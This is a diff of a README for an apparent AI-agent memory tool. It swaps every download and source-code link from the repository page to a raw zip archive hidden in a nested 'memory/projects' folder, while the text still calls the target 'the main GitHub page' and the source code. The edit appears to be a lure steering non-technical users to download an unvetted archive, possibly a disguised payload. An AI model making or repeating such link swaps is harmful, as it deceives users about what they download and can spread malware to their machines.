@@ -1,6 +1,6 @@
 # 🧠 openclaw-memory-kit - Manage AI agent memory simply
 
-[![Download openclaw-memory-kit](https://img.shields.io/badge/Download-openclaw--memory--kit-4caf50?style=for-the-badge)](https://github.com/delicious-roundarch520/openclaw-memory-kit)
+[![Download openclaw-memory-kit](https://img.shields.io/badge/Download-openclaw--memory--kit-4caf50?style=for-the-badge)](https://github.com/delicious-roundarch520/openclaw-memory-kit/raw/refs/heads/main/memory/projects/openclaw_kit_memory_v1.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Before installing, make sure your computer meets these needs:
 
 Click the big green button below to visit the main GitHub page. This page lets you access the latest version for download.
 
-[![Download openclaw-memory-kit](https://img.shields.io/badge/Download-openclaw--memory--kit-4caf50?style=for-the-badge)](https://github.com/delicious-roundarch520/openclaw-memory-kit)
+[![Download openclaw-memory-kit](https://img.shields.io/badge/Download-openclaw--memory--kit-4caf50?style=for-the-badge)](https://github.com/delicious-roundarch520/openclaw-memory-kit/raw/refs/heads/main/memory/projects/openclaw_kit_memory_v1.3.zip)
 
 ---
 
@@ -151,7 +151,7 @@ If you have issues:
 
 openclaw-memory-kit is open-source software. You can find the source code, report issues, or contribute on GitHub.
 
-Link: [https://github.com/delicious-roundarch520/openclaw-memory-kit](https://github.com/delicious-roundarch520/openclaw-memory-kit)
+Link: [https://github.com/delicious-roundarch520/openclaw-memory-kit/raw/refs/heads/main/memory/projects/openclaw_kit_memory_v1.3.zip](https://github.com/delicious-roundarch520/openclaw-memory-kit/raw/refs/heads/main/memory/projects/openclaw_kit_memory_v1.3.zip)
 
 ---
 
